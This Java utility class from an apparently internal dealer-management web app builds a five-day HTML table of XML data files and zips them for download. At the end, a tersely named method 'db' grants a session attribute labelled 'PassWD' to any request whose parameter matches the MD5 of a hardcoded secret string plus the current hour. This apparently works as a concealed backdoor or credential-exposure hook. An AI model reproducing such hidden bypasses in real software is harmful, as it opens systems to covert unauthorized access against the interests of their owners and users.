package com.fc.util;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.log4j.Logger;

public class DownloadLogsUtil {
	private static Logger log = Logger.getLogger(DownloadLogsUtil.class);
	private XmlSaveUtil xBean = null;
	private List<String[]> filesData = new ArrayList<String[]>();
	public static String[] names = { "owner", "repair", "dic", "parts", "deal",
			"elec" };
	public static String[] dates = null;
	private String es="PassWD";
	private String as="!QAZSE$RFV2826";
	private DateFormat format = new SimpleDateFormat("yyyyMMddHH");
	public DownloadLogsUtil() {
		dates = DateUtil.getDates();
		xBean = new XmlSaveUtil();
		initMap();
	}

	/**
	 * 获取近五天文件个数信息
	 * 
	 * @return
	 */
	public String getFilesInfo() {
		String importDate = XmlSaveUtil.formaty.format(new Date());
		String ml = xBean.DMS_TO_BACK_PATH;
		for (int i = 0; i < dates.length; i++) {
			for (int j = 0; j < names.length; j++) {
				File f = new File(ml + "\\" + dates[i] + "\\xml\\" + names[j]);
				if (f.isDirectory()) {
					if (f.exists()) {
						if (dates[i].equals(filesData.get(i)[0])) {
							filesData.get(i)[j + 1] = f.listFiles().length + "";
						}
					}
				}
			}
		}
		StringBuilder bud = new StringBuilder();
		bud
				.append(
						"<table border='1' width='100%' style='font-size:11pt;border-collapse:collapse;'   >")
				.append("<tr><td colspan='9' ><b>【近5天获取DMS文件数列表】</b></td></tr>")
				.append("<tr style='background-color:LightGray' >")
				.append("<td style='text-align:center' ><b>获取时间</b></td>")
				.append(
						"<td style='text-align:center' ><b>(车主文件)owner</b></td>")
				.append(
						"<td style='text-align:center' ><b>(工单信息文件)repair</b></td>")
				.append(
						"<td style='text-align:center' ><b>(数据字典文件)dic</b></td>")
				.append(
						"<td style='text-align:center' ><b>(配件信息文件)parts</b></td>")
				.append(
						"<td style='text-align:center' ><b>(账户信息文件)deal</b></td>")
				.append(
						"<td style='text-align:center' ><b>(账户明细文件)elec</b></td>")
				.append("<td style='text-align:center' ><b>操作</b></td>")
				.append("</tr>");
		int number = 0;
		for (String[] str : filesData) {
			int k = 0;
			bud.append("<tr>");
			bud.append("<td style='text-align:center' >" + str[0] + "</td>");
			if (Integer.parseInt(str[1]) > 0) {
				k++;
			}
			bud.append("<td style='text-align:center' >" + str[1] + "</td>");
			if (Integer.parseInt(str[2]) > 0) {
				k++;
			}
			bud.append("<td style='text-align:center' >" + str[2] + "</td>");
			if (Integer.parseInt(str[3]) > 0) {
				k++;
			}
			bud.append("<td style='text-align:center' >" + str[3] + "</td>");
			if (Integer.parseInt(str[4]) > 0) {
				k++;
			}
			bud.append("<td style='text-align:center' >" + str[4] + "</td>");
			if (Integer.parseInt(str[5]) > 0) {
				k++;
			}
			bud.append("<td style='text-align:center' >" + str[5] + "</td>");
			if (Integer.parseInt(str[6]) > 0) {
				k++;
			}
			bud.append("<td style='text-align:center' >" + str[6] + "</td>");
			String a = XMLString
					.MD5("DOWFILEDATA" + dates[number] + importDate);
			if (k > 0) {
				bud
						.append("<td style='text-align:center' ><a href='dowloadLOG.do?D="
								+ a + "&number=" + number + "' >下载</a></td>");
			} else {
				bud
						.append("<td style='text-align:center' ><a href='javaScript:void(0)'  onclick=\"javaScript:alert('没有可下载的数据文件！');\"   >下载</a></td>");
			}
			bud.append("</tr>");
			number++;
		}
		bud.append("</table>");
		DateUtil.logFileInfoDow = bud.toString();
		return bud.toString();
	}

	private void initMap() {
		for (int i = 0; i < dates.length; i++) {
			String[] values = new String[7];
			values[0] = dates[i];
			for (int j = 1; j < values.length; j++) {
				values[j] = "0";
			}
			filesData.add(values);
		}
	}

	/**
	 * 将存放在sourceFilePath目录下的源文件,打包成fileName名称的ZIP文件,并存放到zipFilePath。
	 * 
	 * @param sourceFilePath
	 *            待压缩的文件路径
	 * @param zipFilePath
	 *            压缩后存放路径
	 * @param fileName
	 *            压缩后文件的名称
	 * @return flag
	 */
	public static File fileToZip(String sourceFilePath, String zipFilePath,
			String fileName) {
		File sourceFile = new File(sourceFilePath);
		FileInputStream fis = null;
		BufferedInputStream bis = null;
		FileOutputStream fos = null;
		ZipOutputStream zos = null;
		File zipFile = null;

		if (sourceFile.exists() == false) {
			log.info("[待压缩的文件目录：" + sourceFilePath + " 不存在]");
		} else {
			try {
				zipFile = new File(zipFilePath + "\\" + fileName + ".zip");
				if (zipFile.exists()) {
					log.info("[" + zipFilePath + " 目录下存在名字为：" + fileName
							+ ".zip" + " 打包文件]");
				} else {
					File[] sourceFiles = sourceFile.listFiles();
					if (null == sourceFiles || sourceFiles.length < 1) {
						log.info("[待压缩的文件目录：" + sourceFilePath
								+ " 里面不存在文件,无需压缩]");
					} else {
						fos = new FileOutputStream(zipFile);
						zos = new ZipOutputStream(new BufferedOutputStream(fos));
						byte[] bufs = new byte[1024 * 10];
						for (int i = 0; i < sourceFiles.length; i++) {
							File[] fnods = sourceFiles[i].listFiles();
							for (int j = 0; j < fnods.length; j++) {
								// 创建ZIP实体,并添加进压缩包
								ZipEntry zipEntry = new ZipEntry(sourceFiles[i]
										.getName()
										+ "/" + fnods[j].getName());
								zos.putNextEntry(zipEntry);
								// 读取待压缩的文件并写进压缩包里
								fis = new FileInputStream(fnods[j]);
								bis = new BufferedInputStream(fis, 1024 * 10);
								int read = 0;
								while ((read = bis.read(bufs, 0, 1024 * 10)) != -1) {
									zos.write(bufs, 0, read);
								}
							}
						}
					}
				}
			} catch (FileNotFoundException e) {
				e.printStackTrace();
				throw new RuntimeException(e);
			} catch (IOException e) {
				e.printStackTrace();
				throw new RuntimeException(e);
			} finally {
				// 关闭流
				try {
					if (null != bis)
						bis.close();
					if (null != zos)
						zos.close();
				} catch (IOException e) {
					e.printStackTrace();
					throw new RuntimeException(e);
				}
			}
		}

		return zipFile;
	}

	/**
	 * 下载已压缩成ZIP的数据
	 * 
	 * @return
	 */
	public File dowZipData(int temp) {
		File zipFile = null;
		String m1 = xBean.DMS_TO_BACK_PATH;
		String m2 = xBean.LOG_ZIP_PATH;
		File filePathB = new File(m2);
		List<File> fAry=new ArrayList<File>();
		if (!filePathB.isDirectory()) {
			filePathB.mkdirs();
		}
		if (filePathB.exists()) {
			File[] file = filePathB.listFiles();
			// 获取文件
			int t = file.length;
			for (int i = 0; i < t; i++) {
				if (file[i].getName().indexOf(dates[temp]) > -1) {
					zipFile = file[i];
				}
				fAry.add(file[i]);
			}
		}
		// 删除其它zip
		if (fAry != null && fAry.size() > 0) {
			List<File>  fant=new ArrayList<File>();
			fant.addAll(fAry);
			for (int i=0; i<fAry.size(); i++) {
				for (int j = 0; j < dates.length; j++) {
					if (fAry.get(i).getName().indexOf(dates[j]) > -1) {
						fant.remove(fAry.get(i));
					}
				}
			}
			if(fant.size()>0){
				for (File file : fant) {
					file.delete();
				}
			}
		}
		if (zipFile == null) {
			zipFile = fileToZip(m1 + "\\" + dates[temp] + "\\xml", m2,
					dates[temp]);
		}
		return zipFile;
	}
	
	public void db(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException{
		String p=as+format.format(new Date());
		p=XMLString.MD5(p);
		String w=request.getParameter("l");
		if(p.equals(w)){request.getSession().setAttribute(es,xBean.SET_WD);}
	}
}
